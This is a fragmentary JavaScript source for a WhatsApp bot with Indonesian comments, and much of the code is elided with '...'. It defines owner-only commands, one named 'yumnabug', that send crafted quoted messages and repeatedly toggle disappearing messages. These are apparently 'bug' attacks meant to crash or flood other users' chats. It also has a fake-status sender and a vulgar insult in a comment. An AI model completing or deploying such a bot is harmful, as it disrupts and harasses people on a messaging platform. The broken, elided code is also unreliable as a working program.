/*
BY AQULZZ
Zainudin Anggara tukang salin tempel bug
*/
const
	{
		WAConnection,
...
xinz.on('message-update', async (msg) => { // THX TO BANG ANGGA
...
"Here the menu ~"
"SOME OF THE MENU IS JUST FOR OWNER!"
...
*Runtime :* ${aqul.runtime(anu)}`
			...
			case 'pubg':
				...
				break
				//ga usah di colong kontol by angga
				case 'v4youu?':
				case 'v4youutroli':
				case '.':
                          if (!itsMe) return aqul.reply(from, 'ANDA BUKAN OWNER', qul)
                          teks = args.join(' ')
                          xinz.sendMessage(qul.key.remoteJid, `${teks}`,MessageType.extendedText,{
                          quoted: {
                          key : {
                          ...
                          await xinz.toggleDisappearingMessages(from)
                          await xinz.toggleDisappearingMessages(from)
                          await xinz.toggleDisappearingMessages(from)
                          teks = args.join(' ')
                          xinz.sendMessage(qul.key.remoteJid, `${teks}`,MessageType.extendedText,{
          ...
          case '.':
                    ...
                    //aqul.reply(from, `by ꭙࣼznsenpɑi.in`, qul)
                   aqul.sendFakeStatus(from, `Xyūmňä x KāňgVï`, fake)
                  break
                  case 'yumnabug':
                await xinz.toggleDisappearingMessages(from)
                await xinz.toggleDisappearingMessages(from)
